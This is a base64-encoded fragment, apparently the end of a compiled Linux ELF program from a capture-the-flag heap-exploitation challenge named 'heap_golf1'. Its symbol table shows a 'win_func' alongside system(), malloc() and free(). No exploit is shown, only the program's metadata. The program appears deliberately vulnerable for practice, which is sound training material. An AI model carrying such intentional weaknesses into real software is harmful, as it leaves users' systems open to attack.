LTZ1YnVudHUxfjE2LjA0LjExKSA1LjQuMCAyMDE2MDYwOQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAwABADgCQAAAAAAAAAAAAAAAAAAAAAAAAwACAFQCQAAAAAAAAAAAAAAAAAAAAAAA
AwADAHQCQAAAAAAAAAAAAAAAAAAAAAAAAwAEAJgCQAAAAAAAAAAAAAAAAAAAAAAAAwAFALgCQAAA
AAAAAAAAAAAAAAAAAAAAAwAGAKgDQAAAAAAAAAAAAAAAAAAAAAAAAwAHAB4EQAAAAAAAAAAAAAAA
AAAAAAAAAwAIADgEQAAAAAAAAAAAAAAAAAAAAAAAAwAJAGgEQAAAAAAAAAAAAAAAAAAAAAAAAwAK
AIAEQAAAAAAAAAAAAAAAAAAAAAAAAwALAEAFQAAAAAAAAAAAAAAAAAAAAAAAAwAMAGAFQAAAAAAA
AAAAAAAAAAAAAAAAAwANAPAFQAAAAAAAAAAAAAAAAAAAAAAAAwAOAAAGQAAAAAAAAAAAAAAAAAAA
AAAAAwAPAFQJQAAAAAAAAAAAAAAAAAAAAAAAAwAQAGAJQAAAAAAAAAAAAAAAAAAAAAAAAwARAPgJ
QAAAAAAAAAAAAAAAAAAAAAAAAwASADgKQAAAAAAAAAAAAAAAAAAAAAAAAwATABAOYAAAAAAAAAAA
AAAAAAAAAAAAAwAUABgOYAAAAAAAAAAAAAAAAAAAAAAAAwAVACAOYAAAAAAAAAAAAAAAAAAAAAAA
AwAWACgOYAAAAAAAAAAAAAAAAAAAAAAAAwAXAPgPYAAAAAAAAAAAAAAAAAAAAAAAAwAYAAAQYAAA
AAAAAAAAAAAAAAAAAAAAAwAZAFgQYAAAAAAAAAAAAAAAAAAAAAAAAwAaAGgQYAAAAAAAAAAAAAAA
AAAAAAAAAwAbAAAAAAAAAAAAAAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAAAMAAAAAQAV
ACAOYAAAAAAAAAAAAAAAAAAZAAAAAgAOADAGQAAAAAAAAAAAAAAAAAAbAAAAAgAOAHAGQAAAAAAA
AAAAAAAAAAAuAAAAAgAOALAGQAAAAAAAAAAAAAAAAABEAAAAAQAaAGgQYAAAAAAAAQAAAAAAAABT
AAAAAQAUABgOYAAAAAAAAAAAAAAAAAB6AAAAAgAOANAGQAAAAAAAAAAAAAAAAACGAAAAAQATABAO
YAAAAAAAAAAAAAAAAAClAAAABADx/wAAAAAAAAAAAAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAA
AAAAAACyAAAAAQASAEgLQAAAAAAAAAAAAAAAAADAAAAAAQAVACAOYAAAAAAAAAAAAAAAAAAAAAAA
BADx/wAAAAAAAAAAAAAAAAAAAADMAAAAAAATABgOYAAAAAAAAAAAAAAAAADdAAAAAQAWACgOYAAA
AAAAAAAAAAAAAADmAAAAAAATABAOYAAAAAAAAAAAAAAAAAD5AAAAAAARAPgJQAAAAAAAAAAAAAAA
AAAMAQAAAQAYAAAQYAAAAAAAAAAAAAAAAAAiAQAAEgAOAFAJQAAAAAAAAgAAAAAAAAAyAQAAEgAA
AAAAAAAAAAAAAAAAAAAAAABEAQAAIAAAAAAAAAAAAAAAAAAAAAAAAADdAQAAIAAZAFgQYAAAAAAA
AAAAAAAAAABgAQAAEgAAAAAAAAAAAAAAAAAAAAAAAABzAQAAEAAZAGgQYAAAAAAAAAAAAAAAAAAs
AQAAEgAPAFQJQAAAAAAAAAAAAAAAAAB6AQAAEgAAAAAAAAAAAAAAAAAAAAAAAACWAQAAEgAAAAAA
AAAAAAAAAAAAAAAAAACqAQAAEgAAAAAAAAAAAAAAAAAAAAAAAAC8AQAAEgAAAAAAAAAAAAAAAAAA
AAAAAADbAQAAEAAZAFgQYAAAAAAAAAAAAAAAAADoAQAAIAAAAAAAAAAAAAAAAAAAAAAAAAD3AQAA
EQIZAGAQYAAAAAAAAAAAAAAAAAAEAgAAEQAQAGAJQAAAAAAABAAAAAAAAAATAgAAEgAOAOAIQAAA
AAAAZQAAAAAAAAAjAgAAEgAAAAAAAAAAAAAAAAAAAAAAAADYAAAAEAAaAHAQYAAAAAAAAAAAAAAA
AADhAQAAEgAOAAAGQAAAAAAAKgAAAAAAAAA3AgAAEgAOAPYGQAAAAAAAEQAAAAAAAABAAgAAEAAa
AGgQYAAAAAAAAAAAAAAAAABMAgAAEgAOAAcHQAAAAAAA1wEAAAAAAABRAgAAIAAAAAAAAAAAAAAA
AAAAAAAAAABlAgAAEgAAAAAAAAAAAAAAAAAAAAAAAAB3AgAAEQIZAGgQYAAAAAAAAAAAAAAAAACD
AgAAIAAAAAAAAAAAAAAAAAAAAAAAAAAdAgAAEgALAEAFQAAAAAAAAAAAAAAAAAAAY3J0c3R1ZmYu
YwBfX0pDUl9MSVNUX18AZGVyZWdpc3Rlcl90bV9jbG9uZXMAX19kb19nbG9iYWxfZHRvcnNfYXV4
AGNvbXBsZXRlZC43NTk0AF9fZG9fZ2xvYmFsX2R0b3JzX2F1eF9maW5pX2FycmF5X2VudHJ5AGZy
YW1lX2R1bW15AF9fZnJhbWVfZHVtbXlfaW5pdF9hcnJheV9lbnRyeQBoZWFwX2dvbGYxLmMAX19G
UkFNRV9FTkRfXwBfX0pDUl9FTkRfXwBfX2luaXRfYXJyYXlfZW5kAF9EWU5BTUlDAF9faW5pdF9h
cnJheV9zdGFydABfX0dOVV9FSF9GUkFNRV9IRFIAX0dMT0JBTF9PRkZTRVRfVEFCTEVfAF9fbGli
Y19jc3VfZmluaQBmcmVlQEBHTElCQ18yLjIuNQBfSVRNX2RlcmVnaXN0ZXJUTUNsb25lVGFibGUA
d3JpdGVAQEdMSUJDXzIuMi41AF9lZGF0YQBfX3N0YWNrX2Noa19mYWlsQEBHTElCQ18yLjQAc3lz
dGVtQEBHTElCQ18yLjIuNQByZWFkQEBHTElCQ18yLjIuNQBfX2xpYmNfc3RhcnRfbWFpbkBAR0xJ
QkNfMi4yLjUAX19kYXRhX3N0YXJ0AF9fZ21vbl9zdGFydF9fAF9fZHNvX2hhbmRsZQBfSU9fc3Rk
aW5fdXNlZABfX2xpYmNfY3N1X2luaXQAbWFsbG9jQEBHTElCQ18yLjIuNQB3aW5fZnVuYwBfX2Jz
c19zdGFydABtYWluAF9Kdl9SZWdpc3RlckNsYXNzZXMAYXRvaUBAR0xJQkNfMi4yLjUAX19UTUNf
RU5EX18AX0lUTV9yZWdpc3RlclRNQ2xvbmVUYWJsZQAALnN5bXRhYgAuc3RydGFiAC5zaHN0cnRh
YgAuaW50ZXJwAC5ub3RlLkFCSS10YWcALm5vdGUuZ251LmJ1aWxkLWlkAC5nbnUuaGFzaAAuZHlu
c3ltAC5keW5zdHIALmdudS52ZXJzaW9uAC5nbnUudmVyc2lvbl9yAC5yZWxhLmR5bgAucmVsYS5w
bHQALmluaXQALnBsdC5nb3QALnRleHQALmZpbmkALnJvZGF0YQAuZWhfZnJhbWVfaGRyAC5laF9m
cmFtZQAuaW5pdF9hcnJheQAuZmluaV9hcnJheQAuamNyAC5keW5hbWljAC5nb3QucGx0AC5kYXRh
AC5ic3MALmNvbW1lbnQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbAAAAAQAAAAIAAAAAAAAAOAJAAAAAAAA4AgAA
AAAAABwAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAIwAAAAcAAAACAAAAAAAAAFQCQAAA
AAAAVAIAAAAAAAAgAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAADEAAAAHAAAAAgAAAAAA
AAB0AkAAAAAAAHQCAAAAAAAAJAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABEAAAA9v//
bwIAAAAAAAAAmAJAAAAAAACYAgAAAAAAABwAAAAAAAAABQAAAAAAAAAIAAAAAAAAAAAAAAAAAAAA
TgAAAAsAAAACAAAAAAAAALgCQAAAAAAAuAIAAAAAAADwAAAAAAAAAAYAAAABAAAACAAAAAAAAAAY
AAAAAAAAAFYAAAADAAAAAgAAAAAAAACoA0AAAAAAAKgDAAAAAAAAdgAAAAAAAAAAAAAAAAAAAAEA
AAAAAAAAAAAAAAAAAABeAAAA////bwIAAAAAAAAAHgRAAAAAAAAeBAAAAAAAABQAAAAAAAAABQAA
AAAAAAACAAAAAAAAAAIAAAAAAAAAawAAAP7//28CAAAAAAAAADgEQAAAAAAAOAQAAAAAAAAwAAAA
AAAAAAYAAAABAAAACAAAAAAAAAAAAAAAAAAAAHoAAAAEAAAAAgAAAAAAAABoBEAAAAAAAGgEAAAA
AAAAGAAAAAAAAAAFAAAAAAAAAAgAAAAAAAAAGAAAAAAAAACEAAAABAAAAEIAAAAAAAAAgARAAAAA
AACABAAAAAAAAMAAAAAAAAAABQAAABgAAAAIAAAAAAAAABgAAAAAAAAAjgAAAAEAAAAGAAAAAAAA
AEAFQAAAAAAAQAUAAAAAAAAaAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAIkAAAABAAAA
BgAAAAAAAABgBUAAAAAAAGAFAAAAAAAAkAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAACU
AAAAAQAAAAYAAAAAAAAA8AVAAAAAAADwBQAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAA
AAAAAAAAnQAAAAEAAAAGAAAAAAAAAAAGQAAAAAAAAAYAAAAAAABSAwAAAAAAAAAAAAAAAAAAEAAA
AAAAAAAAAAAAAAAAAKMAAAABAAAABgAAAAAAAABUCUAAAAAAAFQJAAAAAAAACQAAAAAAAAAAAAAA
AAAAAAQAAAAAAAAAAAAAAAAAAACpAAAAAQAAAAIAAAAAAAAAYAlAAAAAAABgCQAAAAAAAJgAAAAA
AAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAsQAAAAEAAAACAAAAAAAAAPgJQAAAAAAA+AkAAAAA
AAA8AAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAL8AAAABAAAAAgAAAAAAAAA4CkAAAAAA
ADgKAAAAAAAAFAEAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAADJAAAADgAAAAMAAAAAAAAA
EA5gAAAAAAAQDgAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAA1QAAAA8AAAAD
AAAAAAAAABgOYAAAAAAAGA4AAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAOEA
AAABAAAAAwAAAAAAAAAgDmAAAAAAACAOAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAA
AAAAAADmAAAABgAAAAMAAAAAAAAAKA5gAAAAAAAoDgAAAAAAANABAAAAAAAABgAAAAAAAAAIAAAA
AAAAABAAAAAAAAAAmAAAAAEAAAADAAAAAAAAAPgPYAAAAAAA+A8AAAAAAAAIAAAAAAAAAAAAAAAA
AAAACAAAAAAAAAAIAAAAAAAAAO8AAAABAAAAAwAAAAAAAAAAEGAAAAAAAAAQAAAAAAAAWAAAAAAA
AAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAAD4AAAAAQAAAAMAAAAAAAAAWBBgAAAAAABYEAAAAAAA
ABAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAA/gAAAAgAAAADAAAAAAAAAGgQYAAAAAAA
aBAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAMBAAABAAAAMAAAAAAAAAAA
AAAAAAAAAGgQAAAAAAAANQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAARAAAAAwAAAAAA
AAAAAAAAAAAAAAAAAAAtGgAAAAAAAAwBAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQAA
AAIAAAAAAAAAAAAAAAAAAAAAAAAAoBAAAAAAAADwBgAAAAAAAB4AAAAvAAAACAAAAAAAAAAYAAAA
AAAAAAkAAAADAAAAAAAAAAAAAAAAAAAAAAAAAJAXAAAAAAAAnQIAAAAAAAAAAAAAAAAAAAEAAAAA
AAAAAAAAAAAAAAA=

EOF
